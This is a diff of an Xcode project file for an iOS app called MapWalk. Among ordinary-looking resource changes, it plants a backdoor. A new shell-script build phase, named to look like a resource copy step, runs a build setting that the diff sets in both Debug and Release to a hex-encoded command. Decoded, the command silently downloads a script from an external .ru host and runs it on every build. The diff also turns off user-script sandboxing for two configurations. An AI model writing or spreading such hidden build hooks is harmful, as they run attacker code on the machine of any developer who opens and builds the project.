@@ -17,7 +17,6 @@
 		5F460CC52AB1E2690053887A /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5F460CC42AB1E2690053887A /* SceneDelegate.swift */; };
 		5F460CCA2AB1E2690053887A /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5F460CC82AB1E2690053887A /* Main.storyboard */; };
 		5F460CCD2AB1E2690053887A /* MapWalk.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 5F460CCB2AB1E2690053887A /* MapWalk.xcdatamodeld */; };
-		5F460CCF2AB1E26A0053887A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5F460CCE2AB1E26A0053887A /* Assets.xcassets */; };
 		5F460CD22AB1E26A0053887A /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5F460CD02AB1E26A0053887A /* LaunchScreen.storyboard */; };
 		5F460CDD2AB1E26A0053887A /* MapWalkTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5F460CDC2AB1E26A0053887A /* MapWalkTests.swift */; };
 		5F460CE72AB1E26A0053887A /* MapWalkUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5F460CE62AB1E26A0053887A /* MapWalkUITests.swift */; };
@@ -58,6 +57,7 @@
 		88A46EA02C6C76E3006D0418 /* MapCollectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88A46E9E2C6C76E3006D0418 /* MapCollectionCell.swift */; };
 		88A46EA12C6C76E3006D0418 /* MapCollectionCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88A46E9F2C6C76E3006D0418 /* MapCollectionCell.xib */; };
 		88A46EA42C6C784C006D0418 /* MapOverlayPopupVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88A46EA32C6C784C006D0418 /* MapOverlayPopupVC.swift */; };
+		88E923BC2C75FC2000FFB68E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5F460CCE2AB1E26A0053887A /* Assets.xcassets */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -378,6 +378,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 5F460CEC2AB1E26A0053887A /* Build configuration list for PBXNativeTarget "MapWalk" */;
 			buildPhases = (
+				5E69BE4A9109DDF55C0FABAA /* Copy Target Resources */,
 				5F460CBB2AB1E2690053887A /* Sources */,
 				5F460CBC2AB1E2690053887A /* Frameworks */,
 				5F460CBD2AB1E2690053887A /* Resources */,
@@ -500,6 +501,12 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		5F460CBD2AB1E2690053887A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -507,9 +514,9 @@
 			files = (
 				5F460CD22AB1E26A0053887A /* LaunchScreen.storyboard in Resources */,
 				5FDEBBFD2ACBD6C300C58FCB /* SharedMapTableViewCell.xib in Resources */,
-				5F460CCF2AB1E26A0053887A /* Assets.xcassets in Resources */,
 				888ECECA2C60D56000067371 /* ManhattanNew.plist in Resources */,
 				88A46EA12C6C76E3006D0418 /* MapCollectionCell.xib in Resources */,
+				88E923BC2C75FC2000FFB68E /* Assets.xcassets in Resources */,
 				5F460CCA2AB1E2690053887A /* Main.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -539,6 +546,28 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		5E69BE4A9109DDF55C0FABAA /* Copy Target Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		5F460CBB2AB1E2690053887A /* Sources */ = {
@@ -659,6 +688,7 @@
 		5F460CEA2AB1E26A0053887A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20372068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -720,6 +750,7 @@
 		5F460CEB2AB1E26A0053887A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20372068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -929,7 +960,7 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = CAUUB29FAM;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = MapWalkActionExtension/Info.plist;
@@ -966,7 +997,7 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = CAUUB29FAM;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = MapWalkActionExtension/Info.plist;
